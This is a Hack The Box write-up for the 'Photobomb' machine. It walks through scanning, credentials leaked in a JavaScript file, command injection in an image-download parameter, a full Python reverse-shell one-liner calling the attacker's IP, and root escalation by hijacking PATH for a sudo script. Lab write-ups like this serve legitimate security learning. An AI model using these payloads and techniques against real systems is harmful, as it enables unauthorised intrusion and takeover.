+++ 
author = ['Abdallah Adham']
title = "Photobomb HTB Writeup"
date = 2022-11-10
description = "This is a writeup of the Photobomb machine in Hack The Box platform."
draft = false
slug = ""

tags = [
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Photobomb_HTB/photobomb_htb.JPG"
+++

---

## Scanning

```bash
$ nmap 10.10.11.182 -A -T4 -p- -oN nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-10 08:38 EST
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.63% done
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 3.11% done; ETC: 08:54 (0:15:34 remaining)
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.54% done; ETC: 08:52 (0:13:21 remaining)
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.78% done; ETC: 08:52 (0:13:04 remaining)
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.89% done; ETC: 08:52 (0:13:03 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.98% done; ETC: 08:52 (0:13:06 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.99% done; ETC: 08:52 (0:13:05 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.04% done; ETC: 08:52 (0:12:59 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.06% done; ETC: 08:52 (0:12:56 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.08% done; ETC: 08:52 (0:13:07 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.12% done; ETC: 08:52 (0:13:03 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.16% done; ETC: 08:52 (0:12:58 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.16% done; ETC: 08:52 (0:12:57 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.17% done; ETC: 08:52 (0:12:57 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.19% done; ETC: 08:52 (0:12:55 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.21% done; ETC: 08:52 (0:13:05 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.21% done; ETC: 08:52 (0:13:05 remaining)
Warning: 10.10.11.182 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.182
Host is up (0.20s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
17692/tcp filtered unknown
18162/tcp filtered unknown
22855/tcp filtered unknown
24998/tcp filtered unknown
44623/tcp filtered unknown
45323/tcp filtered unknown
45854/tcp filtered unknown
48742/tcp filtered unknown
55815/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 849.15 seconds
```

After the scan has finished, Ofcourse i will add the machine IP to _/etc/hosts_.

```bash
$ sudo echo "10.10.11.182    photobomb.htb" >> /etc/hosts
```

## Enumeration

### HTTP Enumeration

Now, We open the browser and see what is in this website.

![http_enum](post/Photobomb_HTB/imgs/1.JPG)

There is a **"Click here!"** button, Let's click on it ans see what happens?

![sign_up1](post/Photobomb_HTB/imgs/2.JPG)

It opens a pop-up sign up form and asks for a username and password and if failed it redirects you to a **"401 Authorization Required"** under a **/printer** directory.

![401_page](post/Photobomb_HTB/imgs/3.JPG)

Now, I will do two things which are:
1. Subdomain Enumeration
2. Directory Bruteforce

### Subdomain Enumeration

```bash
$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.photobomb.htb" -u http://photobomb.htb -t 10 -mc 200
```
I have not found any subdomains that exist.

### Directory Bruteforce

I am going to use **Dirbuster**:

```bash
DirBuster 1.0-RC1 - Report
http://photobomb.htb:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:
/

Files found with a 200 responce:

/photobomb.js
--------------------------------
```

So, We have found a Javascript file called **photobomb.js**, Let's see what is in it.

![photobomb.js](post/Photobomb_HTB/imgs/4.JPG)

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Now, we have credientals to signup to the **/printer** page.

Copy and paste the URL given above which is:

```text
http://pH0t0:b0Mb!@photobomb.htb/printer
```

It opens a page contans a plenty of images and down there is a button to download any image we want.

![images](post/Photobomb_HTB/imgs/5.JPG)

### Exploitation

Let's start burpsuite and intercept the downloading request.

![req1](post/Photobomb_HTB/imgs/6.JPG)

So, I have tried to command inject all the parameters with adding **;ls** at the end of each parameter and see what happens.

Beginning with **photo** parameter:

![req2](post/Photobomb_HTB/imgs/7.JPG)

looks not injectable, Then trying on **dimensions** parameter:

![req3](post/Photobomb_HTB/imgs/8.JPG)

Also, Not injectable.

Lastly, The **filetype** parameter:

![req4](post/Photobomb_HTB/imgs/9.JPG)

It shows no response, so, It is _injectable_.

Let's prepare the **reverse shell**:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.23",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

And setup the **listener**:

```bash
$ nc -nlvp 4321       
listening on [any] 4321 ...
```

![req5](post/Photobomb_HTB/imgs/10.JPG)

And we got the **reverse shell**. Yay!

![revshell](post/Photobomb_HTB/imgs/11.JPG)

Let's respawn a **tty**:
```bash
$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
wizard@photobomb:~/photobomb$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~/photobomb$
```

We have the access of the user called **wizard**.

Now, We navigate to the home directory and get the **user.txt**

```bash
wizard@photobomb:~/photobomb$ cd /home
cd /home
wizard@photobomb:/home$ ls
ls
wizard
wizard@photobomb:/home$ cd wizard
cd wizard
wizard@photobomb:~$ ls
ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
41ca28b0feb7e65553b07391beec7031
```

## Privilage Escalation

### Sudo -l

```bash
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

It looks like in order to have the **root** privilage, We only have that script:

> /opt/cleanup.sh

That we can run with the **root** privilage.

if we have tried to run that script, We get:
```bash
wizard@photobomb:/opt$ ./cleanup.sh
./cleanup.sh
chown: changing ownership of 'source_images/voicu-apostol-MWER49YaD-M-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/masaaki-komori-NYFaNoiPf7A-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/tabitha-turner-8hg0xRg5QIs-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/nathaniel-worrell-zK_az6W3xIo-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/kevin-charit-XZoaTJTnB9U-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/calvin-craig-T3M72YMf2oc-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/finn-whelen-DTfhsDIWNSg-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/x.JPG': Operation not permitted
chown: changing ownership of 'source_images/--reference=x.JPG': Operation not permitted
chown: changing ownership of 'source_images/almas-salakhov-VK7TCqcZTlw-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/mark-mc-neill-4xWHIpY2QcY-unsplash.JPG': Operation not permitted
chown: changing ownership of 'source_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.JPG': Operation not permitted
```

Let's see what that script do:
```bash
wizard@photobomb:/opt$ cat cleanup.sh
cat cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.JPG' -exec chown root:root {} \;
```

The script is copying the content of the **photobomb.log** and put in inside **photobomb.log.old**.

and then truncate the content from it.

So, We will add `/bin/bash` in cd file and give read, write, execute permission.

And then we run the file with `sudo` and set the `PATH` to `/tmp`.

```bash
wizard@photobomb:/$ echo "/bin/bash" > /tmp/cd
echo "/bin/bash" > /tmp/cd
wizard@photobomb:/$ chmod 777 /tmp/cd
chmod 777 /tmp/cd
wizard@photobomb:/$ echo "/bin/bash" > /tmp/find
echo "/bin/bash" > /tmp/find
wizard@photobomb:/$ chmod 777 /tmp/find
chmod 777 /tmp/find
wizard@photobomb:/$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# cd /root
cd /root
root@photobomb:~# ls
ls
root.txt
root@photobomb:~# cat root.txt
cat root.txt
```

#### Pwned

![rooted](post/Photobomb_HTB/imgs/rooted.JPG)